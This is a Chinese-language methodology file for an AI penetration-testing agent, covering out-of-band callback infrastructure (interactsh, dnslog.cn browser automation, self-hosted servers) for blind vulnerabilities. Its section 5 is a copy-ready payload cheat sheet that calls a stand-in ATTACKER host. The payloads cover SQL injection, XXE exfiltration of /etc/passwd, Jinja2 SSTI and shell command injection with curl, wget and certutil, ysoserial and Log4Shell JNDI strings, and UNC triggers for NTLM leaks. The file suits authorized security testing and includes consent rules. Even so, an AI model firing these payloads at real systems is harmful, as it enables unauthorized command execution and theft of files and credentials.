---
name: oob-infrastructure
description: 核心断言: 现代盲注 / SSRF / XXE / SSTI / 反序列化 几乎都离不开 OOB 通道。 进入 Phase 2 之前, 先架好 OOB 基础设施(或选定公共服务), 否则遇到盲漏洞时复现失败率极高。
category: methodology
---

# OOB (Out-of-Band) 基础设施与协作流程

← 回主入口 [../SKILL.md](../SKILL.md)

> **核心断言**: 现代盲注 / SSRF / XXE / SSTI / 反序列化 几乎都离不开 OOB 通道。
> 进入 Phase 2 之前, 先架好 OOB 基础设施(或选定公共服务), 否则遇到盲漏洞时复现失败率极高。

---

## 1. OOB 是什么 / 为什么必须先架

| 漏洞 | 没 OOB 时的困境 | OOB 能做什么 |
|------|----------------|--------------|
| Blind SQLi | 只能靠 `SLEEP()` 时间盲, 慢且受网络抖动干扰 | DNSLog 外带每字段, 数量级更快 |
| Blind XXE | 无 XML 回显, 被服务器吞错误 | 外部 DTD + 回传 `/etc/passwd` 到 HTTP 日志 |
| Blind SSRF | 目标不在白名单, 看不到响应 | Burp Collaborator / interactsh 记录 DNS 请求证明可达 |
| Blind SSTI | RCE 成功但服务器不回显 | `curl attacker/{{secret}}` 外带 |
| Blind 反序列化 | gadget 触发但看不到输出 | `Runtime.exec("curl xx")` + DNS 回调 |
| Blind 命令注入 | 没 stdout 回显 | `` `curl xx/$(whoami)` `` DNS 前缀外带 |
| 子域名接管验证 | 难证"当前无人接管" | Canary Token 放在接管页面, 触发即通知 |

---

## 2. 三种 OOB 通道 (按可靠性排序)

### 2.1 DNS 通道 (最稳, 绕绝大多数出口防火墙)

- 原理: 目标服务器解析一个你控制的域名, 域名解析请求本身就是 exfil 通道
- 特点: 几乎所有机器都能出站 DNS (53 端口), 即使 HTTP 出口被拦
- 长度限制: 每一级 63 字节, FQDN 总长 253 字节 → 需要分片
- 不足: 只单向 (能证明触发 + 带少量数据, 不能接收回复)

### 2.2 HTTP / HTTPS 通道

- 原理: 目标发 HTTP 请求到你控制的服务器
- 特点: 可以双向交互 (返回恶意内容如 DTD / 反弹 HTML)
- 不足: 出口可能被 WAF / 代理拦 UA 或域名

### 2.3 其他小众通道 (按需)

- SMB / LDAP / FTP / SMTP — Windows 场景特别有用 (UNC 路径打 NTLM hash)
- WebSocket / gRPC 回连 — 较少用但应急可以

---

## 3. 公共 OOB 服务 (零部署, 快速开工)

### 3.1 interactsh (ProjectDiscovery, 推荐)

**公共服务器**: `oast.pro` / `oast.live` / `oast.site` / `oast.online` / `oast.me` / `oast.fun`

```bash
# 一次性 payload (无客户端, 靠 dashboard 看)
# https://app.interactsh.com/ 获取一次性子域

# 带客户端 (终端查看回调)
interactsh-client                         # 默认 oast.pro
interactsh-client -s oast.live -n 10      # 指定服务器, 返回 10 个子域
interactsh-client -json -o oob.json       # JSON 输出

# 输出示例子域: cgg5g40jd34gc66qkedggu5zeuyyyyyyb.oast.pro
```

### 3.2 Burp Collaborator

- Burp Pro 内置, Burp Suite > Collaborator 面板
- 子域格式: `xxx.oastify.com` / `xxx.burpcollaborator.net`
- 限制: 免费版 Community 没有

### 3.3 DNSLog 国内镜像

- **dnslog.cn** — 国内最常用, 免注册 (**推荐, 浏览器 MCP 可全自动化, 见 §3.3.1**)
- **ceye.io** — 功能更全(HTTP/DNS 都记录), 要注册
- **requestrepo.com** — 海外
- **pipedream.com** — 临时 HTTP 回调, 带可视化

### 3.3.1 dnslog.cn + Chrome MCP 自动化手册

> **前置**: `streamable-mcp-server` 已在 Claude Code 的 `mcpServers` 配置中加载, 工具集含 `chrome_*` 系列。未加载时参见 [tool-usage.md §Tier 5](tool-usage.md) 的配置步骤, 或降级 HITL 请用户手动开浏览器。

**页面 DOM 结构** (2026-04 实测):

| 元素 | 选择器 | 作用 |
|------|--------|------|
| Get SubDomain 按钮 | `button[onclick="GetDomain()"]` 或 `#content > button:nth-of-type(1)` | 生成随机子域, 写入 `#myDomain` |
| Refresh Record 按钮 | `button[onclick="GetRecords()"]` 或 `#content > button:nth-of-type(2)` | 拉取 DNS 查询记录, 写入 `#myRecords` |
| 当前子域展示 | `#myDomain` (textContent) | 例: `6hj4gk.dnslog.cn` |
| 记录表 | `#myRecords` (tbody) | 3 列: DNS Query Record / IP Address / Created Time |

**标准自动化序列** (AI 无需 HITL 即可跑完):

```
1. chrome_navigate { url: "http://dnslog.cn/" }
2. chrome_click_element { selector: "button[onclick=\"GetDomain()\"]" }
3. chrome_get_web_content { selector: "#myDomain", textContent: true }
   → 得到子域字符串 (如 "6hj4gk.dnslog.cn"), 立即写入 assets.md 的 "OOB 通道" 段
4. (在 Blind payload 中嵌入该子域, 发起攻击)
5. chrome_click_element { selector: "button[onclick=\"GetRecords()\"]" }
6. chrome_get_web_content { selector: "#myRecords", htmlContent: true }
   → 解析表格行, 命中即证据, 截图入 vulns.md
```

**更优路径** (一次调用等价于上面 2+3 步):

```
chrome_inject_script {
  type: "MAIN",
  jsScript: "GetDomain(); return document.getElementById('myDomain').textContent;"
}
```

**关键约束**:
- 每个新目标 / 每次进度恢复时**重新点 Get SubDomain**, 不复用旧子域 (防止跨目标日志混淆)
- 命中后立即 `chrome_screenshot { selector: "#myRecords", savePng: true }` 截图进 `目标名/evidence/` 作为漏洞证据
- dnslog.cn **只记录 DNS 查询**, 不记录 HTTP 请求 body — 需要 HTTP 回显时改用 ceye.io 或 interactsh
- 服务商可能清理旧数据, 长跑目标请每 24 小时重新 refresh record 并截图存档

**命中判断自动化模板**:

```
chrome_get_web_content 返回的 #myRecords 若含 "No Data" 字符串 → 未命中
否则解析 <tr> 行, 第一列含目标 payload 关键字 (如 ${sid} 前缀) → 命中
```

**典型故障**:

| 症状 | 原因 | 处理 |
|------|------|------|
| `chrome_click_element` 成功但 `#myDomain` 为空 | 网络慢, 接口未返回 | 加 `waitForNavigation: false` + 1-2s 后重读; 或直接 `chrome_inject_script` 调 GetDomain() |
| Refresh Record 无反应 | dnslog.cn CDN 缓存 | payload 每次用新随机前缀, 命中记录会立即出现 |
| 子域含特殊字符被 payload 截断 | — | dnslog.cn 只返回 `[a-z0-9]{6}.dnslog.cn`, 6 位小写字母数字, 无需 URL 编码 |

### 3.4 Canary Token (特殊场景)

- **canarytokens.org** — 触发即邮件 / Slack / Webhook 通知
- 用途: 子域接管验证 / 源码泄露通知 / AK 监控
- 不同类型 Token: DNS / HTTP / Word 文档 / PDF / AWS API Key 等

---

## 4. 自建 OOB 服务器 (长期 / 红线敏感项目)

### 4.1 interactsh 自建

前置: 一个可控域名 + VPS (能解析域名到 VPS)

```bash
# DNS 设置: NS 记录 *.oob.yourdomain.com → ns.oob.yourdomain.com
# A 记录   ns.oob.yourdomain.com    → YOUR_VPS_IP

# 在 VPS 上启动 server
interactsh-server -domain oob.yourdomain.com \
                  -ip YOUR_VPS_IP \
                  -http-port 80 \
                  -https-port 443 \
                  -debug

# 客户端连到自建服务器
interactsh-client -s oob.yourdomain.com
```

**好处**:
- Payload 域名不出现在公共日志 (避免蓝军联动)
- SRC 项目 scope 里白名单你自己的 VPS 即可
- 可持久化记录, 方便复盘

### 4.2 DNSLog 自建 (超轻量, 只 DNS)

```bash
# BugScanTeam/DNSLog (Python)
git clone https://github.com/BugScanTeam/DNSLog
cd DNSLog && docker-compose up -d

# 默认 80/53 端口, 在面板里拿子域
```

---

## 5. 漏洞 → OOB Payload 速查 (复制即用)

> 文中 `ATTACKER` 替换为你的 OOB 子域 (如 `abc123.oast.pro`)。

### 5.1 Blind SQLi

```sql
-- MySQL (Windows, 需要 LOAD_FILE + UNC)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.ATTACKER\\a'))-- -

-- MSSQL
'; EXEC master..xp_dirtree '\\ATTACKER\a'-- -

-- Oracle (utl_http / utl_inaddr)
' UNION SELECT utl_http.request('http://ATTACKER/'||(SELECT user FROM dual)) FROM dual-- -
' AND (SELECT utl_inaddr.get_host_address((SELECT user FROM dual)||'.ATTACKER'))=1-- -

-- PostgreSQL (dblink)
'; SELECT * FROM dblink('host=ATTACKER user=x', 'SELECT 1') AS (t int)-- -
```

### 5.2 Blind SSRF

```
?url=http://ATTACKER/
?url=http://ATTACKER.internal.yourdomain.com/   # 打内部 DNS 解析证据
```

### 5.3 Blind XXE (外部 DTD)

```xml
<!-- 目标 XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd"> %dtd;]>
<foo>&exfil;</foo>

<!-- 你服务器上的 evil.dtd -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%data;'>">
%eval;
```

### 5.4 Blind SSTI (Jinja2)

```
{{ lipsum.__globals__.os.popen('curl http://ATTACKER/$(id|base64)').read() }}
```

### 5.5 Blind Command Injection (Linux)

```bash
;curl http://ATTACKER/`whoami`
`curl http://ATTACKER/?d=$(id|base64)`
$(wget http://ATTACKER/$(hostname))
```

### 5.6 Blind Command Injection (Windows)

```cmd
& nslookup %COMPUTERNAME%.ATTACKER
& certutil -urlcache -f http://ATTACKER/ a.txt
& powershell -c "Invoke-WebRequest http://ATTACKER/$env:USERNAME"
```

### 5.7 Blind 反序列化 (Java)

```
# ysoserial 生成带 DNS 回调的 payload
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/$(whoami)" | base64 -w0

# URLDNS 链 (最轻量, 仅证存在 gadget)
java -jar ysoserial.jar URLDNS http://ATTACKER/
```

### 5.8 Log4Shell (JNDI)

```
${jndi:ldap://ATTACKER/a}
${jndi:dns://ATTACKER/a}              # 只做证存在, 不拿 RCE
${jndi:rmi://ATTACKER:1099/a}
```

### 5.9 Windows UNC 触发 NTLM 泄露

```
file://ATTACKER/share/
\\ATTACKER\share
<img src="\\ATTACKER\a.jpg">
```

(需要 Responder / inveigh 捕获, 但本 skill 不做内网凭证攻击, 仅到证明可触发即停)

---

## 6. 在 skill 里何时必须声明 OOB

**Phase 2 开始前, AI 必须先决定 OOB 通道, 并在 assets.md 写明**:

```markdown
## OOB 通道
- 类型: interactsh 公共
- 当前子域: cgg5g40jd34gc66qkedggu5zeuyyyyyyb.oast.pro
- 启动时间: 2026-04-19 14:30
- 记录位置: interactsh-client 输出到 oob.json
```

**切换规则**:
- 每个目标 / 每次恢复 新生成一个子域 (防跨目标混淆日志)
- 命中任何 OOB payload 后, 立即截图 / 导出 interactsh 日志作为证据入 vulns.md

---

## 7. 常见失败模式 (False Negative)

| 症状 | 可能原因 | 下一步 |
|------|---------|--------|
| Payload 发送但 OOB 无记录 | 出口防火墙过滤公共 OAST 域名 | 换 DNSLog 国内 / 自建 / 换子域 |
| 只收到 DNS 请求没 HTTP | 目标只能出 DNS, 不能出 HTTP | 用纯 DNS 外带方案 (见 §5.1 Oracle 例) |
| interactsh 延迟 > 30s 才收到 | DNS 缓存 / CDN | 改用短 TTL / 带随机前缀 |
| HTTPS 请求 OOB 收不到 | 目标自签或 SNI 校验 | 用 HTTP 或自建带证书的 OAST |
| 重复 payload 合并为单次请求 | 目标有 HTTP 客户端缓存 | 每次用唯一随机子域 |

---

## 8. 配套脚本建议

- AI 应用间接 Prompt 注入:用 `mcp__yaklang__http_fuzzer` + `{{file:prompt-payloads.txt}}` 字典批量打,payload 集见 [ai-app-security.md](ai-app-security.md) §1-3;OOB 回显验证挂本文件 §10 的应急 OOB 子域
- OOB 证据记录: 直接写入目标目录 `vulns.md` 的 "影响证明" 栏 (markdown 手写足够, 不需要 SQLite)

---

## 9. 相关参考

- 主入口 → [../SKILL.md](../SKILL.md)
- SSRF 主文件 → [vuln/ssrf.md](vuln/ssrf.md) + [vuln/ssrf-scenarios.md](vuln/ssrf-scenarios.md)
- XXE → [vuln/xxe.md](vuln/xxe.md)
- 反序列化 → [vuln/deserialize.md](vuln/deserialize.md)
- Log4Shell → [vuln/jndi-log4shell.md](vuln/jndi-log4shell.md)
- 命令注入 → [vuln/cmdi.md](vuln/cmdi.md)
- 子域名接管 → [vuln/subdomain-takeover.md](vuln/subdomain-takeover.md)

---

## 10. 通信类外部资源应急 (P3.5 用户拍板后才用)

> 此节是 [SKILL.md §1 P3.5](../SKILL.md) HITL 协议的**应急可选**,**默认禁止直接调用**。
> 协议规则:用户没有自有资源 + 明确同意 "用公共的" 才能用此清单,否则跳过测试并记录 `[BLOCKED:需要外部资源]`。

| 类型 | 资源 | OPSEC 风险 |
|---|---|---|
| OOB (快速) | dnslog.cn / ceye.io / interactsh-public (app.interactsh.com) | 共享平台,可能被监控 / 历史子域可被反查 |
| 临时邮箱 | mail.tm / temp-mail.org / 10minutemail / guerrillamail | 域名常被风控拦截 / 收信延迟 |
| SMS 接收 (国外) | receive-sms.com / sms-online.co / smspva | 公开号码,可能已被反复使用 |
| SMS 接收 (国内) | (无可靠公共资源) | **强烈推荐用户提供备用手机号** (HITL) |
| 钓鱼 webhook | webhook.site / requestbin.com | 公开服务,溯源可能 |
| 反弹监听 / 隧道 | ngrok / cloudflared tunnel / serveo | 域名特征,可被 IDS 识别 |
| 文件外链托管 | gist.github.com / pastebin / 0x0.st | 可能被目标 WAF 拦截已知域名 |

**使用前清单**:
- [ ] 已经按 SKILL.md §1 P3.5 向用户索取过自有资源
- [ ] 用户明确同意 "用公共的" (不是默认选择)
- [ ] 已告知 OPSEC 风险并记录到 `vulns.md`

**禁止行为** (同 SKILL.md §1 P3.5):
- ❌ 跳过 P3.5 询问步骤直接打公共服务
- ❌ 用此清单后不在 `vulns.md` 记录 OPSEC 风险段
